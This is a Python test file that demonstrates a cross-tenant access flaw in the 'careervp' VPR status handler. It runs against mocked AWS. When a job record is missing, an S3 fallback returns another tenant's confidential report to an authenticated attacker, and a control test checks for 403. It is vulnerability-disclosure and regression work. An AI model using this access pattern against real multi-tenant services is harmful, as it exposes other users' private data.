"""S0b proof: the VPR status S3 fallback serves another tenant's VPR when the
jobs-table row is absent (TTL expiry, or any get_job failure that returns None).

Control test included: with the job row PRESENT and owned by the victim, the same
authenticated attacker must get 403.
"""

from __future__ import annotations

import importlib
import json

import boto3
from moto import mock_aws

from tests.integration import p05_seeding as seeding

VICTIM = 'tenant-A-victim-idor'
ATTACKER = 'tenant-B-attacker-idor'
VPR_BUCKET = 'p05-vpr-results'
VPR_SECRET = 'p05-victim-secret-title'


def _env() -> dict[str, str]:
    env = seeding.table_env()
    env['VPR_RESULTS_BUCKET_NAME'] = VPR_BUCKET
    env['S3_BUCKET_NAME'] = VPR_BUCKET
    return env


def _run(seed_job_row: bool) -> tuple[int, str]:
    vpr_id = 'victim-vpr-0002'
    with mock_aws():
        ddb = boto3.resource('dynamodb', region_name='us-east-1')
        seeding.create_all_tables(ddb)
        s3 = boto3.client('s3', region_name='us-east-1')
        s3.create_bucket(Bucket=VPR_BUCKET)
        s3.put_object(
            Bucket=VPR_BUCKET,
            Key=f'results/{vpr_id}.json',
            Body=json.dumps(
                {
                    'application_id': vpr_id,
                    'user_id': VICTIM,
                    'executive_summary': f'{VPR_SECRET} — confidential victim VPR.',
                    'overall_fit_score': 91,
                }
            ).encode(),
        )

        with seeding.patched_env(_env()):
            seeding.seed_user_profile(VICTIM)
            seeding.seed_user_profile(ATTACKER)

            if seed_job_row:
                ddb.Table(seeding.JOBS_TABLE).put_item(
                    Item={
                        'job_id': vpr_id,
                        'user_id': VICTIM,
                        'status': 'COMPLETED',
                        'created_at': '2026-09-01T00:00:00Z',
                    }
                )

            module = importlib.import_module('careervp.handlers.vpr_status_handler')
            reset = getattr(module, '_reset_handler_caches', None)
            if callable(reset):
                reset()

            event = seeding.authed_event(
                path=f'/vpr/{vpr_id}/status',
                method='GET',
                claims_sub=ATTACKER,
                path_params={'vprId': vpr_id},
            )
            response = module.lambda_handler(event, seeding.lambda_context())
            if callable(reset):
                reset()

    return response.get('statusCode'), (response.get('body') or '')


def test_s0b_control_job_row_present_denies():
    status, body = _run(seed_job_row=True)
    print(f'\nCONTROL (job row present): status={status}')
    print(f'CONTROL body={body[:200]}')
    assert status == 403, f'expected 403 control, got {status}'


def test_s0b_job_row_absent_serves_victim_vpr():
    status, body = _run(seed_job_row=False)
    leaked = VPR_SECRET in body
    has_url = 'download_url' in body
    print(f'\nS0b (job row absent / TTL expired): status={status}')
    print(f'S0b victim secret in body: {leaked}')
    print(f'S0b presigned download_url issued: {has_url}')
    print(f'S0b body={body[:300]}')
    assert status == 200 and leaked, f'status={status} leaked={leaked}'
    print('S0b VERDICT: CONFIRMED — S3 fallback served cross-tenant VPR.')
